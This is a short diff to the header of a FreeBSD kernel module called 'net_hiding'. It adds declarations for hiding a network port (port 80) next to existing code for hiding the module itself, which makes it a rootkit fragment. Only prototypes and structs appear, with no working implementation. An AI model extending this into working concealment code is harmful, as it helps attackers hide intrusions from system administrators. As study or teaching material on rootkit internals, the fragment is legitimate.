@@ -34,12 +34,20 @@
 #include <sys/mutex.h>
 #include <sys/sx.h>
 
+#include <net/if.h>
+#include <netinet/in.h>
+#include <netinet/in_pcb.h>
+#include <netinet/ip_var.h>
+#include <netinet/tcp_var.h>
+
 #define TRUE        1
 #define FALSE       0
 
 #define MODULE_NAME "net_hiding"
 #define MODULE_FILE "net_hiding.ko"
 #define MODULE_HIDE FALSE
+
+#define HIDDEN_PORT 80
 
 /*
  * List of variables that need to be referenced in order to hide this module. 
@@ -65,8 +73,13 @@ struct module {
     modspecific_t       data;       /* module specific data */
 };
 
+struct hidden_port_args {
+    u_int16_t lport;    /* local port */
+};
+
 static int module_events(struct module *, int, void *);
 
 static void hide_module(void);
+static void hide_port(struct thread *, void *);
 
 #endif
